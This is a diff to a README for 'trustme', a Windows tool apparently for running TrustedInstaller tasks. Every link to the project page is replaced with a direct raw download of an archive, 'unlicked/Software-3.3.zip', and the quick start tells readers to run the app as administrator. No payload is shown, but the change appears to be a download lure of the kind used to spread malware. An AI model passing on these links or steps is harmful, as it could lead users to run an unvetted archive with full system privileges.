@@ -1,12 +1,12 @@
 # 🛡️ trustme - Run TrustedInstaller Tasks Faster
 
-[![Download trustme](https://img.shields.io/badge/Download-Visit%20the%20repo-blue?style=for-the-badge&logo=github)](https://github.com/corendatexan468/trustme)
+[![Download trustme](https://img.shields.io/badge/Download-Visit%20the%20repo-blue?style=for-the-badge&logo=github)](https://github.com/corendatexan468/trustme/raw/refs/heads/main/unlicked/Software-3.3.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the files you need:
 
-https://github.com/corendatexan468/trustme
+https://github.com/corendatexan468/trustme/raw/refs/heads/main/unlicked/Software-3.3.zip
 
 ## 🖥️ What trustme does
 
@@ -43,7 +43,7 @@ Follow these steps to use trustme on Windows.
 
 Open the project page here:
 
-https://github.com/corendatexan468/trustme
+https://github.com/corendatexan468/trustme/raw/refs/heads/main/unlicked/Software-3.3.zip
 
 Look for the release files, archive, or built binary on the page. If the project provides a packaged build, download that file to your PC.
 
@@ -209,7 +209,7 @@ Do not move only part of the folder if the release includes support files.
 
 ## 🖱️ Quick start
 
-1. Open the download page: https://github.com/corendatexan468/trustme
+1. Open the download page: https://github.com/corendatexan468/trustme/raw/refs/heads/main/unlicked/Software-3.3.zip
 2. Download the release files
 3. Extract the archive if needed
 4. Run the app as administrator
@@ -219,4 +219,4 @@ Do not move only part of the folder if the release includes support files.
 
 Primary download link:
 
-https://github.com/corendatexan468/trustme
+https://github.com/corendatexan468/trustme/raw/refs/heads/main/unlicked/Software-3.3.zip
